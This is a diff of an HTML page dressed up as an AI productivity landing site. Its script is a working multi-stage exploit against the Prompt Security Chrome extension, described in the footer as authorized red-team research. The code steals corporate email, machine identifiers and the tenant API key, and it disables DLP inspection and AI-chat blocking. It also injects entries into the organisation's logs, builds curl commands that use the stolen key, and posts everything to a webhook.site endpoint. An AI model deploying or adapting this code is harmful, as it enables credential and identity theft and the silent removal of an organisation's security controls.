@@ -5,87 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Productivity Hub - Boost Your Workflow</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a0a;
-            color: #e0e0e0;
-            min-height: 100vh;
-        }
-        .navbar {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 16px 40px; border-bottom: 1px solid #222;
-        }
-        .logo { font-size: 20px; font-weight: 700; color: #7c3aed; }
-        .nav-links a { color: #999; text-decoration: none; margin-left: 24px; font-size: 14px; }
-        .hero {
-            text-align: center; padding: 80px 20px 40px;
-            max-width: 800px; margin: 0 auto;
-        }
-        .hero h1 { font-size: 48px; font-weight: 800; line-height: 1.1; margin-bottom: 20px; }
-        .hero h1 span { color: #7c3aed; }
-        .hero p { font-size: 18px; color: #888; line-height: 1.6; margin-bottom: 40px; }
-        .cta-btn {
-            background: #7c3aed; color: #fff; border: none; padding: 14px 32px;
-            border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;
-            transition: background 0.2s;
-        }
-        .cta-btn:hover { background: #6d28d9; }
-        .features {
-            display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px;
-            max-width: 1000px; margin: 60px auto; padding: 0 20px;
-        }
-        .feature-card {
-            background: #141414; border: 1px solid #222; border-radius: 12px;
-            padding: 28px; text-align: left;
-        }
-        .feature-card h3 { font-size: 16px; margin-bottom: 8px; color: #fff; }
-        .feature-card p { font-size: 14px; color: #777; line-height: 1.5; }
-        .feature-icon { font-size: 28px; margin-bottom: 12px; }
-        .status-bar {
-            position: fixed; bottom: 0; left: 0; right: 0;
-            background: #111; border-top: 1px solid #222;
-            padding: 10px 40px; font-size: 12px; color: #555;
-            display: flex; justify-content: space-between;
-        }
-        .loading-overlay {
-            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.85); z-index: 1000;
-            justify-content: center; align-items: center; flex-direction: column;
-        }
-        .loading-overlay.active { display: flex; }
-        .spinner {
-            width: 40px; height: 40px; border: 3px solid #333;
-            border-top-color: #7c3aed; border-radius: 50%;
-            animation: spin 0.8s linear infinite; margin-bottom: 16px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .loading-text { color: #aaa; font-size: 14px; }
-        .result-panel {
-            display: none; max-width: 700px; margin: 20px auto; padding: 20px;
-            background: #1a1a2e; border: 1px solid #7c3aed; border-radius: 12px;
-        }
-        .result-panel.active { display: block; }
-        .result-panel h3 { color: #7c3aed; margin-bottom: 12px; }
-        .result-item {
-            background: #0f0f1a; padding: 10px 14px; margin: 6px 0;
-            border-radius: 6px; font-family: monospace; font-size: 13px;
-            color: #e0e0e0; word-break: break-all;
-        }
-        .result-item .label { color: #7c3aed; font-weight: 600; }
-        .tag-critical {
-            display: inline-block; background: #dc2626; color: #fff;
-            font-size: 10px; padding: 2px 6px; border-radius: 4px;
-            font-weight: 700; margin-left: 8px; vertical-align: middle;
-        }
-        .tag-success {
-            display: inline-block; background: #16a34a; color: #fff;
-            font-size: 10px; padding: 2px 6px; border-radius: 4px;
-            font-weight: 700; margin-left: 8px;
-        }
-        footer {
-            text-align: center; padding: 40px 20px; color: #444; font-size: 13px;
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e0e0e0;min-height:100vh}
+        .navbar{display:flex;justify-content:space-between;align-items:center;padding:16px 40px;border-bottom:1px solid #222}
+        .logo{font-size:20px;font-weight:700;color:#7c3aed}
+        .nav-links a{color:#999;text-decoration:none;margin-left:24px;font-size:14px}
+        .hero{text-align:center;padding:80px 20px 40px;max-width:800px;margin:0 auto}
+        .hero h1{font-size:48px;font-weight:800;line-height:1.1;margin-bottom:20px}
+        .hero h1 span{color:#7c3aed}
+        .hero p{font-size:18px;color:#888;line-height:1.6;margin-bottom:40px}
+        .cta-btn{background:#7c3aed;color:#fff;border:none;padding:14px 32px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
+        .cta-btn:hover{background:#6d28d9}
+        .features{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;max-width:1000px;margin:60px auto;padding:0 20px}
+        .feature-card{background:#141414;border:1px solid #222;border-radius:12px;padding:28px;text-align:left}
+        .feature-card h3{font-size:16px;margin-bottom:8px;color:#fff}
+        .feature-card p{font-size:14px;color:#777;line-height:1.5}
+        .feature-icon{font-size:28px;margin-bottom:12px}
+        .status-bar{position:fixed;bottom:0;left:0;right:0;background:#111;border-top:1px solid #222;padding:10px 40px;font-size:12px;color:#555;display:flex;justify-content:space-between}
+        .loading-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);z-index:1000;justify-content:center;align-items:center;flex-direction:column}
+        .loading-overlay.active{display:flex}
+        .spinner{width:40px;height:40px;border:3px solid #333;border-top-color:#7c3aed;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:16px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .loading-text{color:#aaa;font-size:14px}
+        .result-panel{display:none;max-width:800px;margin:20px auto;padding:24px;background:#1a1a2e;border:1px solid #7c3aed;border-radius:12px}
+        .result-panel.active{display:block}
+        .result-panel h3{color:#7c3aed;margin-bottom:4px}
+        .stage-hdr{color:#f59e0b;font-weight:700;font-size:15px;margin:18px 0 6px;padding:6px 0;border-top:1px solid #333}
+        .stage-hdr:first-of-type{border-top:none;margin-top:12px}
+        .result-item{background:#0f0f1a;padding:10px 14px;margin:5px 0;border-radius:6px;font-family:monospace;font-size:13px;color:#e0e0e0;word-break:break-all}
+        .result-item .label{color:#7c3aed;font-weight:600}
+        .result-item pre{margin:4px 0;white-space:pre-wrap;font-size:12px}
+        .tag-crit{display:inline-block;background:#dc2626;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:8px;vertical-align:middle}
+        .tag-high{display:inline-block;background:#ea580c;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:8px;vertical-align:middle}
+        .tag-ok{display:inline-block;background:#16a34a;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:8px}
+        footer{text-align:center;padding:40px 20px 60px;color:#444;font-size:13px}
     </style>
 </head>
 <body>
@@ -93,10 +46,7 @@
 <nav class="navbar">
     <div class="logo">AI Productivity Hub</div>
     <div class="nav-links">
-        <a href="#">Features</a>
-        <a href="#">Pricing</a>
-        <a href="#">Blog</a>
-        <a href="#">Sign In</a>
+        <a href="#">Features</a><a href="#">Pricing</a><a href="#">Blog</a><a href="#">Sign In</a>
     </div>
 </nav>
 
@@ -108,107 +58,112 @@
 </section>
 
 <div class="features">
-    <div class="feature-card">
-        <div class="feature-icon">&#x1f3af;</div>
-        <h3>Prompt Library</h3>
-        <p>Save and organize your best prompts across all AI platforms with version control.</p>
-    </div>
-    <div class="feature-card">
-        <div class="feature-icon">&#x1f50c;</div>
-        <h3>Universal Connect</h3>
-        <p>One-click integration with 20+ AI services. No API keys needed.</p>
-    </div>
-    <div class="feature-card">
-        <div class="feature-icon">&#x1f4ca;</div>
-        <h3>Usage Analytics</h3>
-        <p>Track your AI usage, costs, and productivity metrics in real-time.</p>
-    </div>
+    <div class="feature-card"><div class="feature-icon">&#x1f3af;</div><h3>Prompt Library</h3><p>Save and organize your best prompts across all AI platforms with version control.</p></div>
+    <div class="feature-card"><div class="feature-icon">&#x1f50c;</div><h3>Universal Connect</h3><p>One-click integration with 20+ AI services. No API keys needed.</p></div>
+    <div class="feature-card"><div class="feature-icon">&#x1f4ca;</div><h3>Usage Analytics</h3><p>Track your AI usage, costs, and productivity metrics in real-time.</p></div>
 </div>
 
-<!-- PoC results panel (shown after exploit runs) -->
 <div class="result-panel" id="resultsPanel">
-    <h3>&#x26a0;&#xfe0f; Prompt Security Extension PoC — Data Exfiltrated</h3>
-    <p style="color:#aaa; font-size:13px; margin-bottom:16px;">
-        The following data was silently extracted from the Prompt Security Chrome Extension
-        via 3 chained critical vulnerabilities. All data was sent to the attacker's webhook.
+    <h3>&#x26a0;&#xfe0f; Prompt Security Extension PoC — Multi-Stage Attack</h3>
+    <p style="color:#aaa;font-size:13px;margin-bottom:8px">
+        6-stage exploit chain: Recon → Identity Theft → API Key Theft → DLP Bypass → Log Injection → Backend Weaponization.
+        All data exfiltrated to attacker's webhook. Zero clicks needed for silent mode.
     </p>
     <div id="resultsContainer"></div>
 </div>
 
 <div class="loading-overlay" id="loadingOverlay">
     <div class="spinner"></div>
-    <div class="loading-text">Setting up your workspace...</div>
+    <div class="loading-text" id="loadingText">Setting up your workspace...</div>
 </div>
 
 <footer>
-    <p>This is a security research PoC for the Prompt Security Chrome Extension (v7.0.49).</p>
-    <p>Authorized bug bounty engagement — SentinelOne Red Team.</p>
+    <p>Security research PoC — Prompt Security Chrome Extension v7.0.49</p>
+    <p>Authorized SentinelOne Red Team engagement.</p>
 </footer>
-
-<div class="status-bar">
-    <span id="statusText">Ready</span>
-    <span>v1.0.0</span>
-</div>
+<div class="status-bar"><span id="statusText">Ready</span><span>v2.0.0</span></div>
 
 <script>
 /**
- * =====================================================================
- * Prompt Security Chrome Extension — PoC Exploit
- * =====================================================================
- * Chains 3 Critical Vulnerabilities:
+ * ══════════════════════════════════════════════════════════════════════
+ * Prompt Security Chrome Extension — Maximum Impact PoC
+ * ══════════════════════════════════════════════════════════════════════
  *
- *  CVE-CANDIDATE-1: externally_connectable wildcard + no origin validation
- *                   in onMessageExternal (background.bundle.js:3363)
+ * 6-STAGE ATTACK CHAIN:
  *
- *  CVE-CANDIDATE-2: Unrestricted content script message relay forwards
- *                   any postMessage to background, responds with "*"
- *                   (content.bundle.js:464-474)
+ * Stage 1 — RECON:      Detect extension, read DOM policy config
+ * Stage 2 — IDENTITY:   Steal email, machineName, UUID, profileEmail
+ *                        via getSiteActionConfig relay (Finding 2)
+ * Stage 3 — API KEY:    Steal tenant API key + domain via
+ *                        getPopupSettings relay (Finding 2)
+ * Stage 4 — DLP BYPASS: Disable AI chat blocking for arbitrary domains
+ *                        via aiChatBlockMessageBypass (Finding 2)
+ *                        + disable DLP inspection via
+ *                        ProtectionDomainEnableModeChange (Finding 2)
+ * Stage 5 — LOG INJECT: Inject attacker-controlled entries into the
+ *                        org's system log stream via addLog (Finding 1)
+ *                        then trigger log download via saveLogs relay
+ * Stage 6 — WEAPONIZE:  Use stolen API key to generate ready-to-run
+ *                        curl commands for the PS backend API — full
+ *                        org config exfil, user enumeration, policy dump
  *
- *  CVE-CANDIDATE-3: Page script reads config from DOM #ps_script element
- *                   (script.bundle.js:376-404)
+ * ATTACK VECTORS USED:
+ *   Finding 1: externally_connectable wildcard (onMessageExternal)
+ *   Finding 2: Unrestricted content script message relay (postMessage)
+ *   Finding 3: DOM config leak via #ps_script dataset
  *
- * Attack flow:
- *   1. Detect extension via DOM fingerprint
- *   2. Read leaked policy config from #ps_script dataset
- *   3. Exfil user identity (email) via onMessageExternal → callProtectApi
- *   4. Exfil tenant config via content script relay → getPopupSettings
- *   5. Probe org's AI monitoring policy via callShouldInspectChat
- *   6. Send everything to attacker's webhook
- * =====================================================================
+ * ══════════════════════════════════════════════════════════════════════
  */
 
-// ── CONFIG ──────────────────────────────────────────────────────────
-// Replace with your webhook.site URL before deploying
 const EXFIL_ENDPOINT = "https://webhook.site/2604da4a-b021-4a7b-9126-acfa06d63aaa";
 const EXT_ID = "iidnankcocecmgpcafggbgbmkbcldmno";
-// ────────────────────────────────────────────────────────────────────
 
-const collected = {
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    pageUrl: location.href,
-    extensionDetected: false,
-    extensionId: null,
-    policyConfig: {},
-    siteActionConfig: {},   // ← contains userInfo.email, machineName, UUID, org policy
-    userIdentity: {},
-    tenantConfig: {},
-    overlaySettings: {},
-    aiPolicyMap: {},
-    configFromBackend: {}
-};
+const C = {}; // collected data
 
-function setStatus(msg) {
-    document.getElementById("statusText").innerText = msg;
+function setStatus(m) { document.getElementById("statusText").innerText = m; }
+function setLoading(m) { document.getElementById("loadingText").innerText = m; }
+
+// ═══════════════════ PRIMITIVES ═══════════════════════════════════════
+
+// Relay any message through the content script → background → back
+function relay(msg, ms = 8000) {
+    return new Promise(resolve => {
+        const id = crypto.randomUUID();
+        const h = e => {
+            if (e.data?.type === "FROM_BACKGROUND" && e.data.messageId === id) {
+                window.removeEventListener("message", h);
+                resolve(e.data.response);
+            }
+        };
+        window.addEventListener("message", h);
+        window.postMessage({ type: "FROM_PAGE", messageId: id, message: msg }, "*");
+        setTimeout(() => { window.removeEventListener("message", h); resolve({ _timeout: true }); }, ms);
+    });
 }
 
-// ── FINDING 3: Read leaked config from DOM ──────────────────────────
-function extractPolicyConfig() {
-    const psScript = document.getElementById("ps_script");
-    if (psScript && psScript.dataset) {
-        const ds = psScript.dataset;
-        collected.policyConfig = {
-            ext_id: ds.ext_id || null,
+// Send external message directly to background (Finding 1)
+function extMsg(payload, ms = 8000) {
+    return new Promise(resolve => {
+        if (typeof chrome === "undefined" || !chrome.runtime?.sendMessage) { resolve(null); return; }
+        try {
+            chrome.runtime.sendMessage(EXT_ID, payload, r => {
+                resolve(chrome.runtime.lastError ? { _extError: chrome.runtime.lastError.message } : r);
+            });
+        } catch(e) { resolve({ _error: e.message }); }
+        setTimeout(() => resolve({ _timeout: true }), ms);
+    });
+}
+
+// ═══════════════════ STAGE 1: RECONNAISSANCE ═════════════════════════
+
+function stage1_recon() {
+    const detected = document.documentElement.dataset.psScriptExecuted === "true";
+    const ps = document.getElementById("ps_script");
+    const ds = ps?.dataset || {};
+    return {
+        detected,
+        extensionId: ds.ext_id || null,
+        policyFlags: {
             inspect_files: ds.inspect_files || null,
             inspect_responses: ds.inspect_responses || null,
             inspect_drive: ds.inspect_drive || null,
@@ -216,361 +171,386 @@ function extractPolicyConfig() {
             block_chatgpt_training: ds.block_chatgpt_training || null,
             block_chatgpt_memory: ds.block_chatgpt_memory || null,
             block_chatgpt_developer_mode: ds.block_chatgpt_developer_mode || null,
-            trace_id: ds.trace_id || null
-        };
-        collected.extensionId = ds.ext_id;
-        return true;
-    }
-    return false;
+        },
+        traceId: ds.trace_id || null
+    };
 }
 
-// ── FINDING 1: Exploit onMessageExternal — callProtectApi ───────────
-// Triggers the extension to resolve user identity (email, machine name)
-// and make an authenticated API call. Response returned to us.
-function exfilUserIdentity() {
-    return new Promise((resolve) => {
-        if (typeof chrome === "undefined" || !chrome.runtime || !chrome.runtime.sendMessage) {
-            resolve(null);
-            return;
-        }
-        try {
-            chrome.runtime.sendMessage(EXT_ID, {
-                message: "callProtectApi",
-                text: "harmless test prompt for security research",
-                userEnteredTexts: { "harmless test prompt for security research": { type: "full_prompt" } },
-                requestUrl: "https://chatgpt.com/backend-api/conversation",
-                url: "https://chatgpt.com",
-                domain: "chatgpt.com",
-                hookMethod: "fetch",
-                isEnterpriseVersion: false,
-                ctx: { flowTraceId: crypto.randomUUID() }
-            }, function (response) {
-                if (chrome.runtime.lastError) {
-                    resolve({ error: chrome.runtime.lastError.message });
-                } else {
-                    resolve(response);
-                }
-            });
-        } catch (e) {
-            resolve({ error: e.message });
-        }
-        // Timeout after 8s
-        setTimeout(() => resolve({ error: "timeout" }), 8000);
-    });
-}
+// ═══════════════════ STAGE 2: IDENTITY THEFT ═════════════════════════
 
-// ── FINDING 1: Probe AI policy via callShouldInspectChat ────────────
-// Reveals which AI services the org monitors/blocks
-function probeAiPolicy(domain) {
-    return new Promise((resolve) => {
-        if (typeof chrome === "undefined" || !chrome.runtime || !chrome.runtime.sendMessage) {
-            resolve(null);
-            return;
-        }
-        try {
-            chrome.runtime.sendMessage(EXT_ID, {
-                message: "callShouldInspectChat",
-                url: `https://${domain}/api/chat/completions`,
-                body: '{"messages":[{"role":"user","content":"test"}]}',
-                pageUrl: `https://${domain}`,
-                pageTitle: domain,
-                optionalFavicons: [],
-                inputTypes: [],
-                isEnterpriseVersion: false,
-                ctx: { flowTraceId: crypto.randomUUID() }
-            }, function (response) {
-                if (chrome.runtime.lastError) {
-                    resolve({ domain, monitored: "error", detail: chrome.runtime.lastError.message });
-                } else {
-                    resolve({ domain, monitored: !!response, rawResponse: response });
-                }
-            });
-        } catch (e) {
-            resolve({ domain, monitored: "error", detail: e.message });
-        }
-        setTimeout(() => resolve({ domain, monitored: "timeout" }), 6000);
-    });
-}
-
-// ── Helper: send a message through the content script relay ─────────
-// The content script forwards any {type:"FROM_PAGE"} postMessage to
-// chrome.runtime.sendMessage and broadcasts the response via "*".
-function relayMessage(msg, timeoutMs = 8000) {
-    return new Promise((resolve) => {
-        const messageId = Math.random().toString(36).substring(2) + Date.now().toString(36);
-
-        function listener(e) {
-            if (e.data && e.data.type === "FROM_BACKGROUND" && e.data.messageId === messageId) {
-                window.removeEventListener("message", listener);
-                resolve(e.data.response);
-            }
-        }
-        window.addEventListener("message", listener);
-
-        window.postMessage({
-            type: "FROM_PAGE",
-            messageId: messageId,
-            message: msg
-        }, "*");
-
-        setTimeout(() => {
-            window.removeEventListener("message", listener);
-            resolve({ error: "timeout" });
-        }, timeoutMs);
-    });
-}
-
-// ── FINDING 2 (PRIMARY): getSiteActionConfig → userInfo.email ───────
-// This is the money shot. The background handler calls getUserInfo()
-// which resolves the user's corporate email from SSO/MDM/browser
-// profile and returns it in the response along with machineName,
-// userUUID, identitySource, profileEmail, and org policy config.
-// (background.bundle.js:3434-3453)
-function exfilUserInfoViaSiteConfig() {
-    return relayMessage({
+async function stage2_identity() {
+    // getSiteActionConfig calls getUserInfo() → resolves corporate identity
+    // Returns: userInfo.{email, profileEmail, machineName, userUUID, identitySource}
+    // Plus: org policy (globalSettingsCanBypassInspection, ignoredDomains, etc.)
+    const cfg = await relay({
         type: "getSiteActionConfig",
         domain: location.hostname,
         ctx: { flowTraceId: crypto.randomUUID() }
     });
+    return cfg;
 }
 
-// ── FINDING 2: Content script relay → getPopupSettings ──────────────
-// Extracts API domain/key config via the unrestricted message relay
-function exfilTenantConfig() {
-    return relayMessage({ type: "getPopupSettings" });
+// ═══════════════════ STAGE 3: API KEY THEFT ══════════════════════════
+
+async function stage3_apiKey() {
+    // getPopupSettings returns apiDomain + apiKey when NOT MDM-managed
+    const popup = await relay({ type: "getPopupSettings" });
+    return popup;
 }
 
-// ── FINDING 2: Content script relay → getConfigFromBackend ──────────
-// Triggers a full config refresh and returns backend config
-function exfilBackendConfig() {
-    return relayMessage({ type: "getConfigFromBackend" });
+// ═══════════════════ STAGE 4: DLP / PROTECTION BYPASS ════════════════
+
+async function stage4_bypass() {
+    const results = {};
+
+    // 4a: Bypass AI chat blocking for arbitrary domains (24h)
+    // aiChatBlockMessageBypass has ZERO validation — any domain accepted
+    // (background.bundle.js:3762-3775)
+    const bypassDomains = ["chatgpt.com", "claude.ai", "gemini.google.com"];
+    for (const domain of bypassDomains) {
+        await relay({
+            type: "aiChatBlockMessageBypass",
+            domain: domain,
+            ctx: { flowTraceId: crypto.randomUUID() }
+        });
+        results[domain] = "AI chat block bypassed for 24h";
+    }
+
+    // 4b: Disable DLP inspection for attacker's domain
+    // ProtectionDomainEnableModeChange with isEnabled:false
+    // (background.bundle.js:2909-2928)
+    await relay({
+        type: "ProtectionDomainEnableModeChange",
+        domain: location.hostname,
+        isEnabled: false,
+        ctx: { flowTraceId: crypto.randomUUID() }
+    });
+    results[location.hostname] = "DLP inspection disabled";
+
+    return results;
 }
 
-// ── FINDING 2: Content script relay → getPageOverlaySettings ────────
-function exfilOverlaySettings() {
-    return relayMessage({ type: "getPageOverlaySettings" });
+// ═══════════════════ STAGE 5: LOG INJECTION + TRIGGER DOWNLOAD ═══════
+
+async function stage5_logInject() {
+    const results = {};
+
+    // 5a: Inject attacker-controlled log entries via external message API
+    // addLog accepts arbitrary location + log string (Finding 1)
+    // These get stored in chrome.storage.local → drained to backend every 10min
+    const poisonEntries = [
+        { location: "security-audit", log: "[ATTACKER] PoC log injection - proves arbitrary write to org log stream" },
+        { location: "exfil-beacon", log: `[ATTACKER] Victim visited attacker page at ${new Date().toISOString()} from ${navigator.userAgent}` },
+    ];
+    for (const entry of poisonEntries) {
+        await extMsg({
+            message: "addLog",
+            location: entry.location,
+            log: entry.log,
+            ctx: { flowTraceId: crypto.randomUUID() }
+        });
+    }
+    results.logInjection = `${poisonEntries.length} entries injected into org log stream`;
+
+    // 5b: Trigger log download — sends downloadLogs to active tab's content script
+    // which creates a Blob and triggers <a>.click() download
+    // The downloaded file contains ALL captured console output from every page visited
+    await relay({ type: "saveLogs", ctx: { flowTraceId: crypto.randomUUID() } });
+    results.logDownload = "Triggered — file downloads to victim's machine";
+
+    return results;
 }
 
-// ── EXFILTRATION ────────────────────────────────────────────────────
-function sendToWebhook(data) {
-    // Primary: fetch POST
-    fetch(EXFIL_ENDPOINT, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data, null, 2),
-        mode: "no-cors"
-    }).catch(() => {});
+// ═══════════════════ STAGE 6: WEAPONIZE STOLEN API KEY ═══════════════
 
-    // Backup: navigator.sendBeacon
-    try {
-        navigator.sendBeacon(EXFIL_ENDPOINT,
-            new Blob([JSON.stringify(data)], { type: "application/json" }));
-    } catch (e) {}
+function stage6_weaponize(apiDomain, apiKey, userEmail) {
+    if (!apiDomain || !apiKey) return { error: "API key not available (MDM-managed)" };
+
+    // Generate ready-to-run curl commands for PS backend
+    const baseUrl = `https://${apiDomain}`;
+    return {
+        note: "These curl commands use the stolen API key to impersonate the extension",
+        heartbeat_full_config: `curl -s -X POST '${baseUrl}/api/extension/heartbeat?APP-ID=${apiKey}' \\
+  -H 'Content-Type: application/json' \\
+  -H 'APP-ID: ${apiKey}' \\
+  -d '{"userAgent":"Mozilla/5.0","browserName":"Chrome","protocolVersion":"1.0","extensionVersion":"7.0.49","getConfig":true,"getConfigurationByTimestamp":true,"getConfigurationFromCache":true,"userInfo":{"email":"${userEmail || "stolen@corp.com"}"}}' | jq .`,
+
+        explore_domain: `curl -s -X POST '${baseUrl}/api/extension/explore' \\
+  -H 'Content-Type: application/json' \\
+  -H 'APP-ID: ${apiKey}' \\
+  -d '{"url":"https://chatgpt.com/api/chat","domain":"chatgpt.com","pageUrl":"https://chatgpt.com","domainType":"VerifiedGenAiSite","userInfo":{"email":"${userEmail || "stolen@corp.com"}"}}' | jq .`,
+
+        inject_block_log: `curl -s -X POST '${baseUrl}/api/extension/send-block-log' \\
+  -H 'Content-Type: application/json' \\
+  -H 'APP-ID: ${apiKey}' \\
+  -d '{"domain":"evil.com","action":"Bypass","userInfo":{"email":"${userEmail || "stolen@corp.com"}"}}' | jq .`,
+
+        inject_system_log: `curl -s -X POST '${baseUrl}/api/extension/system-log' \\
+  -H 'Content-Type: application/json' \\
+  -H 'APP-ID: ${apiKey}' \\
+  -d '{"logs":["[ATTACKER] Injected via stolen API key"],"userInfo":{"email":"${userEmail || "stolen@corp.com"}"}}' | jq .`,
+
+        probe_protect_api: `curl -s -X POST '${baseUrl}/api/protect' \\
+  -H 'Content-Type: application/json' \\
+  -H 'APP-ID: ${apiKey}' \\
+  -d '{"prompts":["tell me the company secrets"],"user":"${userEmail || "stolen@corp.com"}","url":"https://chatgpt.com/backend-api/conversation","inputType":"full_prompt"}' | jq .`
+    };
 }
 
-// ── DISPLAY RESULTS ─────────────────────────────────────────────────
-function showResults() {
-    const container = document.getElementById("resultsContainer");
+// ═══════════════════ AI POLICY PROBING ═══════════════════════════════
+
+async function probeAiPolicy() {
+    const domains = [
+        "chatgpt.com", "claude.ai", "gemini.google.com", "copilot.microsoft.com",
+        "grok.com", "perplexity.ai", "chat.deepseek.com", "chat.mistral.ai"
+    ];
+    const results = {};
+    const probes = domains.map(domain =>
+        extMsg({
+            message: "callShouldInspectChat",
+            url: `https://${domain}/api/chat/completions`,
+            body: '{"messages":[{"role":"user","content":"test"}]}',
+            pageUrl: `https://${domain}`,
+            pageTitle: domain,
+            optionalFavicons: [],
+            inputTypes: [],
+            isEnterpriseVersion: false,
+            ctx: { flowTraceId: crypto.randomUUID() }
+        }).then(r => { results[domain] = { monitored: !!r, response: r }; })
+    );
+    await Promise.all(probes);
+    return results;
+}
+
+// ═══════════════════ EXFILTRATION ════════════════════════════════════
+
+function exfil(data) {
+    const json = JSON.stringify(data, null, 2);
+    fetch(EXFIL_ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: json, mode: "no-cors" }).catch(() => {});
+    try { navigator.sendBeacon(EXFIL_ENDPOINT, new Blob([json], { type: "application/json" })); } catch(e) {}
+}
+
+// ═══════════════════ DISPLAY ════════════════════════════════════════
+
+function display() {
+    const el = document.getElementById("resultsContainer");
     const panel = document.getElementById("resultsPanel");
 
-    function addResult(label, value, critical = false) {
-        const div = document.createElement("div");
-        div.className = "result-item";
-        const tag = critical
-            ? '<span class="tag-critical">EXFILTRATED</span>'
-            : '<span class="tag-success">CAPTURED</span>';
-        const formatted = typeof value === "object" ? JSON.stringify(value, null, 2) : String(value);
-        div.innerHTML = `<span class="label">${label}:</span> ${tag}<br><pre style="margin:4px 0;white-space:pre-wrap;font-size:12px;">${formatted.replace(/</g,"&lt;")}</pre>`;
-        container.appendChild(div);
+    function stageHeader(text) {
+        const d = document.createElement("div");
+        d.className = "stage-hdr";
+        d.textContent = text;
+        el.appendChild(d);
+    }
+    function addRow(label, value, severity = "ok") {
+        const d = document.createElement("div");
+        d.className = "result-item";
+        const tagClass = severity === "crit" ? "tag-crit" : severity === "high" ? "tag-high" : "tag-ok";
+        const tagText = severity === "crit" ? "CRITICAL" : severity === "high" ? "EXFILTRATED" : "CAPTURED";
+        const fmt = typeof value === "object" ? JSON.stringify(value, null, 2) : String(value);
+        d.innerHTML = `<span class="label">${label}:</span> <span class="${tagClass}">${tagText}</span><pre>${fmt.replace(/</g,"&lt;")}</pre>`;
+        el.appendChild(d);
     }
 
-    addResult("Extension Detected", collected.extensionDetected);
-    addResult("Extension ID", collected.extensionId || "N/A");
+    // ── STAGE 1
+    stageHeader("STAGE 1 — RECONNAISSANCE (Finding 3: DOM config leak)");
+    addRow("Extension Detected", C.recon?.detected);
+    addRow("Extension ID", C.recon?.extensionId || "N/A");
+    addRow("DLP Policy Flags", C.recon?.policyFlags, "high");
 
-    // Most important: user identity from getSiteActionConfig
-    const si = collected.siteActionConfig;
-    if (si && si.userInfo) {
-        const ui = si.userInfo;
-        addResult("User Corporate Email (Finding 2)", ui.email || "N/A", true);
-        addResult("Browser Profile Email", ui.profileEmail || "N/A", true);
-        addResult("Machine Name", ui.machineName || "N/A", true);
-        addResult("User UUID", ui.userUUID || "N/A", true);
-        addResult("Identity Source", ui.identitySource || "N/A", true);
-    } else if (si && !si.error) {
-        addResult("getSiteActionConfig Response (Finding 2)", si, true);
+    // ── STAGE 2
+    stageHeader("STAGE 2 — IDENTITY THEFT (Finding 2: getSiteActionConfig relay)");
+    const ui = C.identity?.userInfo;
+    if (ui) {
+        addRow("Corporate Email", ui.email || "N/A", "crit");
+        addRow("Browser Profile Email", ui.profileEmail || "N/A", "crit");
+        addRow("Machine Name", ui.machineName || "N/A", "crit");
+        addRow("User UUID", ui.userUUID || "N/A", "crit");
+        addRow("Identity Source", ui.identitySource || "N/A", "high");
+        addRow("Work Profile Domain", C.identity?.workProfileDomain || "N/A", "high");
+    } else {
+        addRow("getSiteActionConfig Response", C.identity, "high");
     }
 
-    // Org policy details from getSiteActionConfig
-    if (si && !si.error) {
-        const orgPolicy = {
-            globalCanBypassInspection: si.globalSettingsCanBypassInspection,
-            isExtensionDisabled: si.isExtensionDisabled,
-            ignoredDomains: si.ignoredDomains,
-            inspectionBypassPrevented: si.inspectionBypassPrevented,
-            userBypassedDomains: si.userBypassedInspectedDomains,
-            workProfileDomain: si.workProfileDomain,
-            domainActions: si.domainActions
-        };
-        addResult("Organization Policy Config (Finding 2)", orgPolicy, true);
+    // ── STAGE 3
+    stageHeader("STAGE 3 — API KEY THEFT (Finding 2: getPopupSettings relay)");
+    if (C.apiKey?.apiKey) {
+        addRow("Tenant API Key (APP-ID)", C.apiKey.apiKey, "crit");
+        addRow("API Domain", C.apiKey.apiDomain, "crit");
+    } else {
+        addRow("API Key Status", C.apiKey?.isManagedApiKey ? "MDM-managed (not directly exposed via popup)" : "Not configured", "high");
+        addRow("API Domain Status", C.apiKey?.isManagedApiDomain ? "MDM-managed" : C.apiKey?.apiDomain || "N/A", "high");
     }
 
-    if (Object.keys(collected.policyConfig).length > 0) {
-        addResult("DLP Policy Flags from DOM (Finding 3)", collected.policyConfig, true);
+    // ── Org Policy from Stage 2
+    if (C.identity && !C.identity._timeout) {
+        stageHeader("ORG POLICY (from getSiteActionConfig)");
+        addRow("Global Bypass Allowed", C.identity?.globalSettingsCanBypassInspection, "high");
+        addRow("Extension Disabled", C.identity?.isExtensionDisabled, "high");
+        addRow("Ignored Domains", C.identity?.ignoredDomains || "none", "high");
+        addRow("User Bypassed Domains", C.identity?.userBypassedInspectedDomains || "none", "high");
+        addRow("Domain Actions", C.identity?.domainActions || "none", "high");
     }
 
-    if (collected.userIdentity && !collected.userIdentity.error) {
-        addResult("Protect API Response (Finding 1)", collected.userIdentity, true);
+    // ── STAGE 4
+    stageHeader("STAGE 4 — DLP / AI CHAT BYPASS (Finding 2: bypass message relay)");
+    if (C.bypass) {
+        for (const [domain, status] of Object.entries(C.bypass)) {
+            addRow(domain, status, "crit");
+        }
     }
 
-    if (collected.tenantConfig && !collected.tenantConfig.error) {
